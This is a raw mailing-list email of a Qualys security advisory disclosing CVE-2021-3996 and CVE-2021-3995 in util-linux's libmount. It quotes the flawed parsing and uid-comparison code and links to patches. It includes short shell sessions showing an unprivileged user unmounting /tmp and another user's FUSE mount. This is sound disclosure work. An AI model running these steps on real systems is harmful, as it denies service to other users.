X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7179" "Monday" "24" "January" "2022" "12:25:33" "+0000" "Qualys Security Advisory" "qsa@qualys.com" nil "173" "[oss-security] CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount" nil nil nil "1" nil nil (number mark "U       qsa@qualys.c Jan 24  173/7179  " thread-indent "\"[oss-security] CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28283 invoked by uid 550); 24 Jan 2022 12:25:48 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28265 invoked from network); 24 Jan 2022 12:25:47 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
 date : message-id : content-type : content-id : content-transfer-encoding
 : mime-version; s=qualyscom;
 bh=7mNXqfq+NLenmEyfFL8V1BmWgd1iuU3z8nh7BaKiidA=;
 b=iqbG8cmp0/ni95BmnukE9YwpTypr+iPsGtStH7nWDVW9J7dn2gaXCFD59OjbViwPU1lp
 MgvA+mogrYVtFfjMJYxQDweBNCH1OtyNTsghL9vnwICSv/VyfjFQtTKzhsL+rVGjJPuR
 PV46OxqQberj5LUDNYVTgUnosQXLYRp5ejIIUf0+vLxZ2YG/UcFvfFBkeNAp+X6CtOrP
 tJtqFK8V3vbswp4icPoYpmgrrPsKPl5bcuibiE0JIho3HFRyi2EV3iwAroLuXUSqA2ff
 pVvZJ/m4mRfj+WPMNNR4295ZxO7AhGOzGJZTR0dF+WqtCwVkM5QjicTyKVfy6TRUJ9nR fA== 
Authentication-Results: ppops.net;
	spf=pass smtp.mailfrom=qsa@qualys.com
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=catgXiInlpHOqGqtbIM5025mD6u1/Q/d2b6Qoxi4VyA+axg0ksQcVC26j+KUIYCeBOw+ekJ+gnpNiGk5NIZpKWQyE/utK39UbpKXgAfPCpwART8XeptIT+bShyrSiUSUMx8dOnlhoKc25sCvSv4Dfy4e7hJXjigQS3JDDc8HeLkHBu8XisdGe5vXarw6XKRkKKJcmddkq8vduKNY0TlBCoyzAe/ueP+LwFuhz2W+hpObpqhw5L79xq8rMh49hCAuYS0N7XeAK9xnQBejvwKHhBzxJf+d5/wdhWkdhDxAtyHweNzpz9V3FVk82YaZGEsS/nPO3vco4RSiyVNYnXP7vg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=7mNXqfq+NLenmEyfFL8V1BmWgd1iuU3z8nh7BaKiidA=;
 b=jsZeSsbGvf5hWvuVnMH/yTsL8ssVFfc2tCCcABiAmOqgwQAkrBx13eeCRmp41xVI4umByAn4PfdlVOgARf9e4NMZ3bKpEHV+ChoXnHqwgb+Haz09K8IHwZ2ySdsxGXekd10NPWO8+vHn1xkZC+2aGfZCDD7MTHyr7DLH92eJsKCe4LBUCLzPp7GlldFdfIa2KxdvGnac+m3dNUy/dDhYOaiP77grKHBwy0odwy2OqnmUqq1fIwTSdyaRe0kPwE4utBIlieqgE02tGXopZl9zPcQugq6eV+ALY0k0OtWpK3nC5fwjwT5QLvfrFyL3t8dJWOOzIJcVYoivdBR554HfgQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=7mNXqfq+NLenmEyfFL8V1BmWgd1iuU3z8nh7BaKiidA=;
 b=Pq3aQxSq9m8Q0y0hirstJxIY/jJcWqdzlCViiYT8zPKB7KQmHYGX3cWAyFPI2zRoWEwsi7sxXE1WE6Wa+JIyaCr57IhmG7uuyJJMhy6MWKqueVrHlzffh+1VcoIVJJcgPbn0VUAiUcDMakVH6GkiOye+v/IY8QUasjpVHtmg3b8qrFT9E3IfpdYwwTKDZ67OLBZdzi5eespeLciKIIksCI8HDQIoW7CdKmowoHt1J0nhOEUwRD85axNasF96p53oIxESy06wi+MpDn4ZSb/NYeTOASq8LaTOn7JBDbYwo6zHOJUPHFoNXT1fv1JsqlMHvwkXH3DDBkrS69xbi741kw==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount
Thread-Index: AQHYER17BkB/XXL4ekGNHE3GBUhVfQ==
Date: Mon, 24 Jan 2022 12:25:33 +0000
Message-ID: <20220124122440.GA18854@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: 330e1502-bb85-44f2-e1e2-08d9df349e07
x-ms-traffictypediagnostic: SJ0PR06MB7694:EE_
x-microsoft-antispam-prvs: 
 <SJ0PR06MB7694172A8CE00C99CAB48B21D55E9@SJ0PR06MB7694.namprd06.prod.outlook.com>
x-ms-oob-tlc-oobclassifiers: OLM:478;
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 HHQMoCqaU+3ZnizNOwBu6qHHtDBX5bZwZc+DyIeum5eXWwQW8HNQYf6guFwJ0DPK1nnSWjPAjvcGFiCO+uPBjlGdhq+6lOnxXqjsy/nZhnKb1C0HIJakYosj581OPNY5vSK6U1zKzoQIaGbLrfK8brZ096I6FHWGDuojpRRRPltl8cUfJpkdHq1n2aFIrEVpjDCjQoegVDcXWv1rpIK08FnmCyUIWraEBrUMCjiWCAck3GehmQ7GrRUH1Qd6Rgq6g37OM6N5fknHTU2kYC3Z2Klu9yVTkceuhF+33ZU67r1UBrF7RcV/gjmKbEjK39JSKwKC2pqHl99GmTjf/YJZyNT+FUNUgkid+tD15GXyYFl7Km6NfPuqCfzWoWslWaonc+yIdKtFXib3DS2M7+VBmnzFLT1iqV9JR7zOYKy/9nhRCxzaJaCdbD2mns0ZBKEmYv360vBZkmmiNTMQSjsx6eCJ872oVaKYYb41fytrrhUVbRA2XkvhWMRwHvvIoRc1MTHVKA+nJvV1WP9UrVKzq20SpHsdoz/JKXAvQker2RLu4vqOy8qlP8glfgqXsaKFnnjA1EqgggDTnVyVhAMyAPCmSr+Z+x9Bv1w+qlHqmGyhVaYvC7p8LMFAfb6NLYvZNV1EQNybqpN1cNO/Vw3B+D3tVtHIcuZqvhVHGhN0uRXh6LBQz9DKh1PCGgXDGIsViWColwEs9DHUclO7GFQXcQH/QF+xiLvtHj9WGyXWZhNegT6aLzDs1uA96jJJwmXN8lzIQloFYP7I5WvT2L2sPoKNoOHvDCb9Sr+IvG9ql+kGL3V2ENCavWlfWOVogLVZEEDEr89zSWnIjlg9TdiaIg==
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(366004)(71200400001)(6916009)(83380400001)(76116006)(966005)(508600001)(8676002)(1076003)(38100700002)(6506007)(86362001)(186003)(2906002)(8936002)(33656002)(66476007)(9686003)(6512007)(26005)(66446008)(64756008)(66556008)(122000001)(66946007)(316002)(38070700005)(6486002)(5660300002);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?us-ascii?Q?WDNSZ4SCkDeXEzqndZIx/LageDX3J2IiOsFjRm5CYqNAajcZxnsGIzSc/5ir?=
 =?us-ascii?Q?hyuk+HQY9bkgLk45lZh507lnSEIPbAONE9cYCdNBaD5ZNGlF9M1tzzKdnw73?=
 =?us-ascii?Q?i1TpVDOX/2lm2KAVtJQyPC174j3UAXWqbkuy1U56EZIO1CRd/+vMsPXp6ozG?=
 =?us-ascii?Q?Ukt51D1v9RxwxNoCcKPhwiv6hmb+nsdxpsAqsJSA/2s3rzBJCQ6yyS8ApKuP?=
 =?us-ascii?Q?yPyRZzkeUBbmPLA1wKySYa17PtSQrlTlIdpFek5UwZFYD5kCpSSm0pbIXFrB?=
 =?us-ascii?Q?NDnu3O4AUusWsPhYni+9tKlag7vRjYjHrNo2fF1+zDpO8iRLY/YHbxFcOVyZ?=
 =?us-ascii?Q?YAHcs+jmgIiXdN3xrXrVfakA27pTEzdGg4rSqwOI4WHt+IkwC6l1IpMHMXid?=
 =?us-ascii?Q?1vnJn3MifLqQczZ7EfRr6N+i/WNwa6jpQXiYnKDCtNpNNmOfXVLHXq1NuC1S?=
 =?us-ascii?Q?NT1AXj15CZJW+ROC+vxuR4Rxj9a+4dDISSSnjfOmaL5HlqdqFgjQLg9ShkNc?=
 =?us-ascii?Q?miVBTpUsigkjeoDozi26u9NNPIeKKKL3wEZBgtL/wtptjsc27VyJJ/AHV9CW?=
 =?us-ascii?Q?IZQSkayejUcAe/acxT8OhqOdfhqQGSaFAFRm1xRmc1jJqvm1Gloi4KCajGT2?=
 =?us-ascii?Q?HwaDmmmWIaTXmmFxk/jKP2Uqre2tJ3pzGgjdWwe3D1M3/sk1T4SuAmo8WcjP?=
 =?us-ascii?Q?c9dL9PccRG3XHyiJWdVYpPwvTByJrwCgmPLA9uH3VCYrUyOUzmGGgKPU7xsK?=
 =?us-ascii?Q?3Lf3rvRWN/rL7xC6DPgb5dCn388nStZmhoD6Ig1OIBoyiOx/j14y2VriDV+r?=
 =?us-ascii?Q?2RGBQfdfOa7shgkhWNfWUZUk+/i/nAhmv1DdmPY672y6RBq63lN9jMMk66//?=
 =?us-ascii?Q?hADWtkZAJBUHb6qwuGeOuguU+M+aLoVDSmCxMshpC9PMbTn+SND/3Qzhd8Zc?=
 =?us-ascii?Q?Kn0nO1unafQ9esJrMuTmGHy39Ph+iy2bi6A5goPUyuiY2gTEZ/21RkFnapU2?=
 =?us-ascii?Q?pYOmYqVF3KPa/Go5YO2p7imvGa3FKV7YEFxxsgps4Vc9i/zs7qwTtfK+7edX?=
 =?us-ascii?Q?bZtY6Dma+OF0dUr6GOhgu5Xdf4+z7xNXEG7oN04dA6A86Wb83agWlwRLpQVI?=
 =?us-ascii?Q?UlWs66Rvbrs9rKsONWgmq1BU72mc28lRbUOC/yKJCVf/IjRSNVfLXxOXqGe1?=
 =?us-ascii?Q?fu1VQoYPG2R4VE//4wc/QDc1vR6nTY37Ck0e0IM3n7E5DEreRp0F4J1eGKvd?=
 =?us-ascii?Q?EO6d++/MXTtj/sbP9kxmJ9AH4uJouLz7wrNkyvvlqfmLXEHAxRLkpiCtneDD?=
 =?us-ascii?Q?z6jQiTU6aFY3fr3H5ZwXAAqb7gnRVxHqUbrJE7MSYq1f3hOgWwovGOJgjt+9?=
 =?us-ascii?Q?EZxtOInJveu2M7uiC9sKrJYkh4W3hcJ4synnaPo9bWVxHtpGcc9dYFaxDuTs?=
 =?us-ascii?Q?RjRZ831L4JfT3eqTQGgMl3pD/CO0wpfaio6osH44H77Hwi3aSUu3nDNhngLS?=
 =?us-ascii?Q?jq5lG7oCoS4WP1n275GxH42NyBWMfWOfWRBkFpLIsBIGYGDPEICeRjY9X9MJ?=
 =?us-ascii?Q?ORZWhTTUa57iOlwrl6HqGQwtCPT1Wb+FYUj2+R5lGczR9NsjeroxWnEg52qZ?=
 =?us-ascii?Q?H0yt1B00sJKF0kSTYhtGgQ/dQAjt7v6mKE7ob3RMMJd7Jo3cEHwdHCKUnK86?=
 =?us-ascii?Q?YXBrM38z7z7uJdkTQ6Lo5grpE3k=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <5B8E1151D47B3D4F97E6F513E54D18C7@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 330e1502-bb85-44f2-e1e2-08d9df349e07
X-MS-Exchange-CrossTenant-originalarrivaltime: 24 Jan 2022 12:25:33.1308
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: +bkoG2yi8/nT+wi6yfe6Aex5jXnlafZtmAcfRj739QIkz80FTzYtjJ2Vxr8HS85KWrImbxF7mKRaQ1qqfthtXCCEyUMNFM0we2ynU9eMLW0=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ0PR06MB7694
X-Proofpoint-GUID: FyrZeWFhHyjwPxwaIe5K3wvw3bA4vneG
X-Proofpoint-ORIG-GUID: FyrZeWFhHyjwPxwaIe5K3wvw3bA4vneG
X-Proofpoint-SPF-Result: pass
X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
 include:spf-001ca501.pphosted.com include:stspg-customer.com
 include:_spf.salesforce.com include:mktomail.com
 include:emailus.freshservice.com a:sendgrid.avolio.tech ~all
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.205,Aquarius:18.0.816,Hydra:6.0.425,FMLib:17.11.62.513
 definitions=2022-01-24_06,2022-01-24_01,2021-12-02_01
X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0 mlxlogscore=999
 suspectscore=0 lowpriorityscore=0 adultscore=0 clxscore=1034
 priorityscore=1501 bulkscore=0 mlxscore=0 phishscore=0 impostorscore=0
 spamscore=0 malwarescore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.12.0-2201110000 definitions=main-2201240082
Subject: [oss-security] CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount

Hi all,

We discovered two vulnerabilities (unauthorized unmounts) in
util-linux's libmount, CVE-2021-3996 and CVE-2021-3995. Patches are now
available at (many thanks to Karel Zak, Red Hat Product Security, and
the members of linux-distros@openwall):

https://github.com/util-linux/util-linux/commit/166e87368ae88bf31112a30e078=
cceae637f4cdb
https://github.com/util-linux/util-linux/commit/57202f5713afa2af20ffbb6ab53=
31481d0396f8d
https://github.com/util-linux/util-linux/commit/9c05f4b6bf62a20a64a8e5735c7=
f3dcf0229e895

https://github.com/util-linux/util-linux/commits/stable/v2.37
https://mirrors.edge.kernel.org/pub/linux/utils/util-linux/v2.37/

Below is a short write-up (which is part of a longer advisory that is
mostly unrelated to util-linux and that we will publish at a later
date):


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[...]

Consequently, we audited the SUID-root programs umount and fusermount
for ways to unmount a filesystem that does not belong to us, and we
discovered CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount
(which is used internally by umount).

Note: CVE-2021-3996 and CVE-2021-3995 were both introduced by commit
5fea669 ("libmount: Support unmount FUSE mounts") in November 2018.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-3996: Unauthorized unmount in util-linux's libmount
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

In order for an unprivileged user to unmount a FUSE filesystem with
umount, this filesystem must a/ be listed in /proc/self/mountinfo, and
b/ be a FUSE filesystem (lines 466-470), and c/ belong to the current,
unprivileged user (lines 477-498):

------------------------------------------------------------------------
 451 static int is_fuse_usermount(struct libmnt_context *cxt, int *errsv)
 452 {
 ...
 466         if (strcmp(type, "fuse") !=3D 0 &&
 467             strcmp(type, "fuseblk") !=3D 0 &&
 468             strncmp(type, "fuse.", 5) !=3D 0 &&
 469             strncmp(type, "fuseblk.", 8) !=3D 0)
 470                 return 0;
 ...
 477         if (mnt_optstr_get_option(optstr, "user_id", &user_id, &sz) !=
=3D 0)
 478                 return 0;
 ...
 490         uid =3D getuid();
 ...
 497         snprintf(uidstr, sizeof(uidstr), "%lu", (unsigned long) uid);
 498         return strncmp(user_id, uidstr, sz) =3D=3D 0;
 499 }
------------------------------------------------------------------------

Unfortunately, when parsing /proc/self/mountinfo, the libmount blindly
removes any " (deleted)" suffix from the mountpoint pathnames (at lines
231-233):

------------------------------------------------------------------------
 17 #define PATH_DELETED_SUFFIX     " (deleted)"
------------------------------------------------------------------------
 179 static int mnt_parse_mountinfo_line(struct libmnt_fs *fs, const char *=
s)
 180 {
 ...
 223         /* (5) target */
 224         fs->target =3D unmangle(s, &s);
 ...
 231         p =3D (char *) endswith(fs->target, PATH_DELETED_SUFFIX);
 232         if (p && *p)
 233                 *p =3D '\0';
------------------------------------------------------------------------

This vulnerability allows an unprivileged user to unmount other users'
filesystems that are either world-writable themselves (like /tmp) or
mounted in a world-writable directory.

For example, on Fedora, /tmp is a tmpfs, so we can mount a basic FUSE
filesystem named "/tmp/ (deleted)" (with FUSE's "hello world" program,
./hello) and unmount /tmp itself (a denial of service):

------------------------------------------------------------------------
$ id
uid=3D1000(john) gid=3D1000(john) groups=3D1000(john) context=3Dunconfined_=
u:unconfined_r:unconfined_t:s0-s0:c0.c1023

$ grep /tmp /proc/self/mountinfo
84 87 0:34 / /tmp rw,nosuid,nodev shared:38 - tmpfs tmpfs rw,seclabel,size=
=3D2004304k,nr_inodes=3D409600,inode64

$ mkdir -m 0700 /tmp/" (deleted)"
$ ./hello /tmp/" (deleted)"

$ grep /tmp /proc/self/mountinfo
84 87 0:34 / /tmp rw,nosuid,nodev shared:38 - tmpfs tmpfs rw,seclabel,size=
=3D2004304k,nr_inodes=3D409600,inode64
620 84 0:46 / /tmp/\040(deleted) rw,nosuid,nodev,relatime shared:348 - fuse=
.hello hello rw,user_id=3D1000,group_id=3D1000

$ mount | grep /tmp
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,seclabel,size=3D2004304k,nr_inode=
s=3D409600,inode64)
/home/john/hello on /tmp/ type fuse.hello (rw,nosuid,nodev,relatime,user_id=
=3D1000,group_id=3D1000)

$ umount -l /tmp/
$ grep /tmp /proc/self/mountinfo | wc
      0       0       0
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-3995: Unauthorized unmount in util-linux's libmount
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Alert readers may have spotted another vulnerability in
is_fuse_usermount(): at line 498, only the first "sz" characters of the
current user's uid are compared to the filesystem's "user_id" option (sz
is user_id's length). This second vulnerability allows an unprivileged
user to unmount the FUSE filesystems that belong to certain other users;
for example, if our own uid is 1000, then we can unmount the FUSE
filesystems of the users whose uid is 100, 10, or 1:

------------------------------------------------------------------------
$ id
uid=3D1000(john) gid=3D1000(john) groups=3D1000(john) context=3Dunconfined_=
u:unconfined_r:unconfined_t:s0-s0:c0.c1023

$ grep fuse /proc/self/mountinfo
38 23 0:32 / /sys/fs/fuse/connections rw,nosuid,nodev,noexec,relatime share=
d:18 - fusectl fusectl rw
620 87 0:46 / /mnt/bin rw,nosuid,nodev,relatime shared:348 - fuse.hello hel=
lo rw,user_id=3D1,group_id=3D1

$ umount -l /mnt/bin
$ grep fuse /proc/self/mountinfo
38 23 0:32 / /sys/fs/fuse/connections rw,nosuid,nodev,noexec,relatime share=
d:18 - fusectl fusectl rw
------------------------------------------------------------------------


Thank you very much! We are at your disposal for questions, comments,
and further discussions.

With best regards,

--=20
the Qualys Security Advisory team=
